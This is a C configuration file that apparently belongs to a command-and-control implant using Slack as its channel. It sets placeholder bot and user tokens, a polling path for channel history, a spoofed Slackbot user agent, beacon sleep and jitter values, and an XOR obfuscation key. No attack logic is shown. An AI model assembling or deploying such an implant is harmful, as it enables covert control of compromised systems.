#include "Header.h"


Config gConfig = {
    .botToken = "[BOTTOKEN]",
    .userToken = "[USERTOKEN]",
    .channelId = "[CHANNEL]",
    .currentWorkingDir = NULL,
    .path = "/api/conversations.history?channel=[CHANNEL]&limit=10&include_all_metadata=true",
    .headers = "Authorization: Bearer [BOTTOKEN]\r\n",
    .userAgent = "Slackbot 1.0 (+https://api.slack.com/robots)",
    .maxMsgLength = 8192,
    .maxMsgToGet = 10,
    .sleepInterval = 10000,
    .sleepJitter = 0,
    .xorKeySize = 32,
    .xorKey = {
        0xe9, 0xfb, 0xb4, 0xd6, 0x2a, 0x0c, 0x3a, 0x1d,
        0x7e, 0x2c, 0x49, 0xf8, 0x6d, 0xb5, 0x0b, 0xc9,
        0x7a, 0xd4, 0x5a, 0xee, 0xf3, 0xc2, 0xd1, 0xa8,
        0x6b, 0x47, 0xb7, 0xd4, 0xf8, 0x14, 0x1f, 0xc2
    }
};
